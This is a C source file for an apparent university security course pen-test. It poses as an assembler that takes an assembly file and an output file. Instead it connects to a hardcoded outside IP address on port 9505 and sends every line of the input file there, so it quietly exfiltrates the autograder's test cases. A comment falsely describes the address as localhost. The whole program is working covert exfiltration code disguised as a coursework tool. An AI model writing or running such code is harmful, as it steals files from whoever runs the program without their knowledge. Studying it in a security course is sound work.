/*
** 588_assemble.c -- A test-case exfiltration program. Part of the EECS 588 autograder pen-test. ayarger@umich.edu.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define PORT "9505"
#define MAXDATASIZE 100

#define MAXLINELENGTH 1000
#define MAXRCVLEN 500

#define PORTNUM 9505
#define _GNU_SOURCE

int readAndSend(FILE *, int);

/* std=c99 seems to lack this function for preparing IP addresses.
 Copied here to avoid that issue. */
int inet_aton(const char *cp, struct in_addr *ap)
{
    int dots = 0;
    register unsigned long acc = 0, addr = 0;

    do {
	register char cc = *cp;

	switch (cc) {
	case '0':
	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	    acc = acc * 10 + (cc - '0');
	    break;

	case '.':
	    if (++dots > 3) {
		return 0;
	    }
	    /* Fall through */

	case '\0':
	    if (acc > 255) {
		return 0;
	    }
	    addr = addr << 8 | acc;
	    acc = 0;
	    break;

	default:
	    return 0;
	}
    } while (*cp++) ;

    /* Normalize the address */
    if (dots < 3) {
	addr <<= 8 * (3 - dots) ;
    }

    /* Store it if requested */
    if (ap) {
	ap->s_addr = htonl(addr);
    }

    return 1;    
}

int main(int argc, char *argv[])
{
    char buffer[MAXRCVLEN + 1]; /* +1 so we can add null terminator */
    int len, mysocket;
    char *inFileString;
    FILE *inFilePtr;
    struct sockaddr_in dest; 

    /* Network Setup */	
    mysocket = socket(AF_INET, SOCK_STREAM, 0);
  
    memset(&dest, 0, sizeof(dest));                /* zero the struct */
    dest.sin_family = AF_INET;
    inet_aton("52.200.20.87", (struct in_addr *)&dest.sin_addr.s_addr); /* set destination IP number - localhost, 127.0.0.1*/ 
    dest.sin_port = htons(PORTNUM);                /* set destination port number */
 
    connect(mysocket, (struct sockaddr *)&dest, sizeof(struct sockaddr));
  
    /* Input Functionality */
    if (argc != 3) {
        printf("error: usage: %s <assembly-code-file> <machine-code-file>\n", argv[0]);
        exit(1);
    }
	
    inFileString = argv[1];	
    inFilePtr = fopen(inFileString, "r");
    if (inFilePtr == NULL) {
        printf("error in opening %s\n", inFileString);
        exit(1);
    }
    
    readAndSend(inFilePtr, mysocket);
	
    /* Network cleanup */
    close(mysocket);
    return EXIT_SUCCESS;
}

int readAndSend(FILE *inFilePtr, int sockfd)
{
    char line[MAXLINELENGTH];
    char *ptr = line;

    /* read the line from the assembly-language file */
    while (fgets(line, MAXLINELENGTH, inFilePtr) != NULL) {
        send(sockfd, line, strlen(line), 0);
    }
    
    return(1);
}
